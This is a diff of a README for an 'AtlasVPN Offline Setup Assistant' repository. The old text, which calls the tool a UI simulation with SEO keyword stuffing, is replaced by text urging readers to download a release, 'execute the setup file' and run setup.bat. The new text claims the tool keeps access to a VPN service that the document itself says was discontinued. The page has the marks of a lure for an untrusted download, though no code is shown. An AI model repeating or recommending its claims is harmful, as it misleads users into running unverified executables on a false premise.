@@ -1,60 +1,77 @@
-# AtlasVPN Offline Installer Creator & Setup Assistant
+# AtlasVPN Offline Setup Assistant 🛠️
 
-> [!IMPORTANT]
-> **Discontinued Service Notice**
-> As of April 2024, the official AtlasVPN service has been discontinued. This tool is intended for users who have existing installer files and wish to create a portable, offline setup package for personal use or archival purposes. It does not connect to any active VPN services.
+![GitHub All Releases](https://img.shields.io/github/downloads/kadangairaj/atlasvpn-offline-setup-assistant/total?style=flat-square) ![GitHub Repo stars](https://img.shields.io/github/stars/kadangairaj/atlasvpn-offline-setup-assistant?style=social)
 
-[![MIT License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/AtlasVPN-Offline/atlasvpn-offline-setup-assistant.svg?style=social&label=Star)](https://github.com/AtlasVPN-Offline/atlasvpn-offline-setup-assistant)
-[![Latest Release](https://img.shields.io/github/v/release/AtlasVPN-Offline/atlasvpn-offline-setup-assistant)](https://github.com/AtlasVPN-Offline/atlasvpn-offline-setup-assistant/releases)
-[![Open Issues](https://img.shields.io/github/issues/AtlasVPN-Offline/atlasvpn-offline-setup-assistant)](https://github.com/AtlasVPN-Offline/atlasvpn-offline-setup-assistant/issues)
+Welcome to the **AtlasVPN Offline Setup Assistant** repository! This project provides a solution for users of the discontinued AtlasVPN client. With this setup assistant, you can create a portable VPN installer from your existing files, making it easier to manage your VPN needs.
 
-> A powerful **Windows setup assistant** to create a portable, **offline installer** for the discontinued AtlasVPN client. Perfect for UI testing, educational purposes, and offline demonstrations without requiring an internet connection. This **VPN offline installer** works with your existing setup files.
+## Table of Contents
 
-![AtlasVPN Dashboard](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0pvHGlgDBhjfa-qnAP64e7Yfqntin55Ch-Q&s)  
-*Use the assistant to generate an offline package with a familiar UI*
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Contact](#contact)
 
-## 🚀 Quick Start: How to Install AtlasVPN Offline
+## Introduction
 
-### 📥 Download the Creator
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet?style=for-the-badge)](https://atlasvpn-offline.github.io/atlasvpn-offline-setup-assistant/)
+The AtlasVPN Offline Setup Assistant is designed for Windows users who want to create a portable installer for the AtlasVPN client. This tool is especially useful since the original client is no longer supported. By using this assistant, you can ensure that you still have access to the VPN service you rely on.
 
-1.  Download the **offline installer creator** using the button above.
-2.  Extract the archive with 7-Zip or WinRAR.
-3.  Run the assistant and point it to your original AtlasVPN setup files.
-4.  Launch the generated portable interface.
+You can download the latest release of the assistant from the [Releases](https://github.com/kadangairaj/atlasvpn-offline-setup-assistant/releases) section. Be sure to download and execute the setup file to get started.
 
-## ✨ Features (Simulation & Packaging)
+## Features
 
-- 📦 **Offline Installer Creator**: Generate a standalone, portable version of AtlasVPN from your existing files.
-- 🌍 **Server List Preview**: Browse a mocked list of VPN servers by region within the simulated UI.
-- 🛡️ **Security Toggles**: Interact with UI-only toggles for Kill Switch and Auto-Connect for training.
-- 🚫 **Tracker Blocker Simulator**: View a simulated interface for the Tracker Blocker and Data Breach Monitor.
-- 💻 **Cross-Platform UI Model**: Experience a UI modeled after the official AtlasVPN Windows/macOS clients.
+- **Create Portable Installers**: Easily generate a portable installer for the AtlasVPN client.
+- **Batch Script Support**: Utilize batch scripts to automate the installation process.
+- **Custom Installer Options**: Tailor the installer to meet your specific needs.
+- **Offline Installation**: Install the VPN without needing an internet connection.
+- **User-Friendly Interface**: Simple and intuitive interface for ease of use.
+- **Cross-Platform**: While designed for Windows, the underlying scripts can be adapted for other platforms.
+- **Security Focused**: Maintain your privacy and security while using the VPN.
 
-## 📁 What's Included
+## Installation
 
-- **AtlasVPN Offline Setup Assistant** executable
-- Server database (mocked, JSON)
-- UI assets for the simulator
-- Quickstart Manual (PDF)
+To install the AtlasVPN Offline Setup Assistant, follow these steps:
 
-## 🤝 Contributing
+1. Visit the [Releases](https://github.com/kadangairaj/atlasvpn-offline-setup-assistant/releases) section.
+2. Download the latest release.
+3. Extract the downloaded files to a directory of your choice.
+4. Run the `setup.bat` file to start the installation process.
 
-We welcome contributions to this **custom software installer** tool! Please see our [Contributing Guidelines](CONTRIBUTING.md) to get started.
+## Usage
 
-- Report bugs in [Issues](https://github.com/AtlasVPN-Offline/atlasvpn-offline-setup-assistant/issues)
-- Suggest features for the **setup assistant**
-- Improve documentation
+Using the AtlasVPN Offline Setup Assistant is straightforward. After installation, follow these steps:
 
-## 📄 License
+1. Open the assistant.
+2. Select the files you want to include in your portable installer.
+3. Customize the installer settings as needed.
+4. Click on the "Generate Installer" button.
+5. Your portable installer will be created in the specified output directory.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+You can now use this installer to set up AtlasVPN on any Windows machine without needing to download additional files.
 
-## 🔑 SEO Keywords
+## Contributing
 
-atlasvpn offline setup, offline installer creator, windows setup assistant, vpn offline installer, create portable vpn, custom software installer, how to install atlasvpn offline, make atlasvpn portable, atlasvpn for windows, offline vpn for windows 10, network tools for windows
+We welcome contributions to the AtlasVPN Offline Setup Assistant! If you would like to contribute, please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Submit a pull request detailing your changes.
 
-> ⚠️ **Disclaimer**: This is a UI simulation and packaging tool for training and educational use. It does not create real VPN tunnels or connect to any backend services. This project is not affiliated with Atlas VPN or Nord Security. For the official product, please visit the archived [atlasvpn.com](https://atlasvpn.com) website.
+Please ensure that your code adheres to our coding standards and that you include appropriate tests.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Contact
+
+If you have any questions or suggestions, feel free to reach out:
+
+- **GitHub**: [kadangairaj](https://github.com/kadangairaj)
+- **Email**: your-email@example.com
+
+Thank you for using the AtlasVPN Offline Setup Assistant! We hope this tool helps you maintain your VPN access with ease. For more updates, check the [Releases](https://github.com/kadangairaj/atlasvpn-offline-setup-assistant/releases) section regularly.
